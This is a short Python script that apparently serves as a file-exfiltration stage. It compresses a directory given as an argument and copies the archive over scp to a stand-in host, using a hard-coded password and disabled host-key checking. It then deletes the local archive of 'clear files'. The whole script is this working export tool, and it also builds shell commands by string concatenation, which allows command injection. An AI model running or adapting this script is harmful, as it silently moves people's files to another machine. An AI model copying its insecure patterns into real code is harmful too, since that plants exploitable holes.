#!/usr/bin/env python3

import requests
import os
import subprocess
import sys
import shutil

print("------Files found------")
dir_path = sys.argv[1]

#install sshpass
def has_sshpass():
	return shutil.which("sshpass") is not None

if has_sshpass():
	print("sshpass already installed")
else:
	cmd = "sudo apt install sshpass"
	subprocess.run(cmd, shell=True)

#compress the whole directory to send it
archive = "export.tar.gz"
cmd = "tar -zcvf " + archive + " " + dir_path
subprocess.run(cmd, shell=True)

#send all files by scp wherever you want (change password)
print("------Export------")
cmd = "sshpass -p 'userpasswd' scp -o StrictHostKeyChecking=no " + archive + " user@127.0.0.1:~/Desktop/receive"
subprocess.run(cmd, shell=True)
print("  [+] Files exported")

#delete archive with all clear files
os.remove(archive)
